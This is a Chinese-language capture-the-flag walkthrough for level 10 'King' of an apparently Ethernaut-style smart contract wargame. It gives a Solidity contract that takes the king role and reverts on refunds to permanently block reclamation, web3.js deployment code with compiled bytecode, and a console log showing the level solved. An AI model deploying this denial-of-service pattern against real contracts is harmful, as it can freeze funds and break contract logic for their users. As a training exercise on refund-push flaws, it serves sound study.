

# 10 King

## 思路

当发送一定数量的eth到示例合约后, 发送方会成为新的King. 但"提交"时题目会夺回king并返还你发送的eth. 要阻止king被夺回, 就需要阻止其返还eth, (我不收, 你就没法返还).

这里的需要注意的是, 发送方可以是player这样的外部账户地址, 也可以是合约地址, 使用合约地址就可以编写代码逻辑: 返还eth时直接revert

思路: 新建一个合约, player给该合约一些eth, 该合约将这些eth发送到题目中的合约, 然后新建的合约的地址就成了新的king,   当题目中的合约返还eth的时候直接revert而阻止其返还

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Cracker {
    address public player;

    constructor() payable {
        require(msg.value > 0.001 ether);
        player = msg.sender;
    }
    
    //target传入题目中实例地址
    function attack(address _target) public {
        //向_target发送eth,以便成为king
        _target.call{value: address(this).balance}("");

    }

    receive() external payable {
        //如果不是player发送的eth,则退回
        //这可以阻止老国王退回eth而无法夺回王位 【邪恶的笑~~】
        if (msg.sender != player) {
            revert();
        }
    }
}

```







```js
const abi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"player","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}];

const byteCode = "0x" +
	"608060405266038d7ea4c68000341161001757600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506102ab806100666000396000f3fe60806040526004361061002d5760003560e01c806348db5f8914610091578063d018db3e146100bc5761008c565b3661008c5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461008a57600080fd5b005b600080fd5b34801561009d57600080fd5b506100a66100e5565b6040516100b391906101b6565b60405180910390f35b3480156100c857600080fd5b506100e360048036038101906100de9190610202565b610109565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff164760405161012d90610260565b60006040518083038185875af1925050503d806000811461016a576040519150601f19603f3d011682016040523d82523d6000602084013e61016f565b606091505b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101a082610175565b9050919050565b6101b081610195565b82525050565b60006020820190506101cb60008301846101a7565b92915050565b600080fd5b6101df81610195565b81146101ea57600080fd5b50565b6000813590506101fc816101d6565b92915050565b600060208284031215610218576102176101d1565b5b6000610226848285016101ed565b91505092915050565b600081905092915050565b50565b600061024a60008361022f565b91506102558261023a565b600082019050919050565b600061026b8261023d565b915081905091905056fea264697066735822122005869b604efdcfe8f2d02a81eb3fe2086b448468f90095c72f0ba9a5e9a8e77764736f6c634300080f0033"


const myContract = new web3.eth.Contract(abi);
const deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
const myInstance = await deploy.send({
	from: player,
	gas: 1500000,
	gasPrice: '30000000000000',
	value: web3.utils.toWei('0.1', 'ether')
});

await myInstance.methods.attack(instance).send({ from: player });
```



## 参考答案

```
^^.js:45 ᕦ(ò_óˇ)ᕤ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:21:40.848
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x674b412b25e34eba7da764eed6142369d1b05a6e50a526b29591798e0fa48c6a
^^.js:35 => 实例地址0xB3C72fA75a3Db0e28BC0c2aE4302f54A59515376
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:21:46.729
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x674b412b25e34eba7da764eed6142369d1b05a6e50a526b29591798e0fa48c6a
redux-logger.js:1  action SET_BLOCK_NUM @ 10:21:56.219
const abi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"player","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}];

const byteCode = "0x" +
	"608060405266038d7ea4c68000341161001757600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506102ab806100666000396000f3fe60806040526004361061002d5760003560e01c806348db5f8914610091578063d018db3e146100bc5761008c565b3661008c5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461008a57600080fd5b005b600080fd5b34801561009d57600080fd5b506100a66100e5565b6040516100b391906101b6565b60405180910390f35b3480156100c857600080fd5b506100e360048036038101906100de9190610202565b610109565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff164760405161012d90610260565b60006040518083038185875af1925050503d806000811461016a576040519150601f19603f3d011682016040523d82523d6000602084013e61016f565b606091505b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101a082610175565b9050919050565b6101b081610195565b82525050565b60006020820190506101cb60008301846101a7565b92915050565b600080fd5b6101df81610195565b81146101ea57600080fd5b50565b6000813590506101fc816101d6565b92915050565b600060208284031215610218576102176101d1565b5b6000610226848285016101ed565b91505092915050565b600081905092915050565b50565b600061024a60008361022f565b91506102558261023a565b600082019050919050565b600061026b8261023d565b915081905091905056fea264697066735822122005869b604efdcfe8f2d02a81eb3fe2086b448468f90095c72f0ba9a5e9a8e77764736f6c634300080f0033"


const myContract = new web3.eth.Contract(abi);
const deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
const myInstance = await deploy.send({
	from: player,
	gas: 1500000,
	gasPrice: '30000000000000',
	value: web3.utils.toWei('0.1', 'ether')
});
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x434c650e63686338925e5edadcafad758c0837aebfb7326b51eb74a59a3ffde7
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x434c650e63686338925e5edadcafad758c0837aebfb7326b51eb74a59a3ffde7
undefined
redux-logger.js:1  action SET_BLOCK_NUM @ 10:22:46.218
await myInstance.methods.attack("0xB3C72fA75a3Db0e28BC0c2aE4302f54A59515376").send({ from: player });
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x4f4af05d31263c2fab1bc8e10a4347c4625e9628e5f459bec6720b1bd3bb6832
{transactionHash: "0x4f4af05d31263c2fab1bc8e10a4347c4625e9628e5f459bec6720b1bd3bb6832", transactionIndex: 0, blockNumber: 72, blockHash: "0xb2f3a6e37cb6379d5dfc6b31a5e778e59466e15696c1b9098b163fcc8f874b76", from: "0x6bcc722d477c66ede81f5af555ff7b05f81e78f8", …}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x4f4af05d31263c2fab1bc8e10a4347c4625e9628e5f459bec6720b1bd3bb6832
redux-logger.js:1  action SET_BLOCK_NUM @ 10:26:36.277
^^.js:45 ╚(▲_▲)╝ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 10:26:37.723
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x6b6a6591bd2bcaaf7605afb7755feabf06532e4aa5943d0a37e42105e057a3d5
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 10:26:44.849
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x6b6a6591bd2bcaaf7605afb7755feabf06532e4aa5943d0a37e42105e057a3d5
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 10:26:46.275

```

